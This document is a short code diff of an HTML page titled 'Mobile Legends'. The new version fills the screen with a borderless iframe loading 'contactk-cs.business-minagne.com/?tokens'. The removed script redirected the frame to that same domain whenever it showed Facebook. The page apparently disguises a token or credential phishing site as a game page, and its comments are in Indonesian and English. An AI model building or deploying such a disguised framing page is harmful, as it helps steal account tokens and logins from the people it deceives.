@@ -1,20 +1,33 @@
-<script>
-    // Fungsi untuk memeriksa jika URL mengandung "facebook"
-    function isFacebookURL(url) {
-        return url.includes("facebook.com") || url.includes("fb.com");
-    }
-
-    // Awasi perubahan window location
-    setInterval(function() {
-        try {
-            var currentURL = iframe.contentWindow.location.href;
-            if (isFacebookURL(currentURL)) {
-                alert("Akses ke Facebook diblokir.");
-                iframe.src = "https://contactk-cs.business-minagne.com/?tokens"; // atau redirect ke halaman lain
-            }
-        } catch (e) {
-            // Tidak bisa akses iframe karena cross-origin (CORS)
-            console.warn("Tidak bisa akses konten iframe karena CORS.");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobile Legends</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100%;
         }
-    }, 1000); // periksa setiap detik
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+<iframe id="myFrame"></iframe>
+
+<script>
+    // Get the iframe element
+    var iframe = document.getElementById('myFrame');
+    
+    // Set the source URL for the iframe
+    var url = 'https://contactk-cs.business-minagne.com/?tokens'; //
+    iframe.src = url;
 </script>
